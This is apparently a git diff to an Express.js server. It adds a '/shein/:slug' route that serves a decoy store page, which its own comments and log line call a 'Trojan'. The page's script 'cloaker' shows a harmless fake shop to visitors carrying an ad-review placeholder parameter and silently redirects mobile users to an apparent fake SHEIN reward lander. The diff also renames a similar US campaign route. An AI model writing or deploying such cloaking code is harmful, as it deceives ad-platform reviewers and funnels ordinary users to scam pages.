@@ -1365,8 +1365,41 @@ app.get('/rydsep/:slug', (req, res, next) => {
 });
 
 
-// Middleware to pass on my slug values to MaxConv (SHEIN US CAMP)
+// Middleware to pass on my slug values to MaxConv (SHEIN TR CAMP)
 app.get('/shein/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tok-reward.com/trshein.html?slug=${slug}`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+        </head>
+        <body>
+            <h1>Welcome to the ${slug} Store!</h1>
+            <p>You are browsing ${slug}'s Web Shop.</p>
+        </body>
+        </html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served shein Trojan (${slug})`);
+});
+
+// Middleware to pass on my slug values to MaxConv (SHEIN US CAMP)
+app.get('/sheinus/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://klcxb6.mcgo2.com/visit/1cc3f21b-9970-4cf1-98d6-2105066f060d?slug=${slug}`;
     const trojanHTML = `
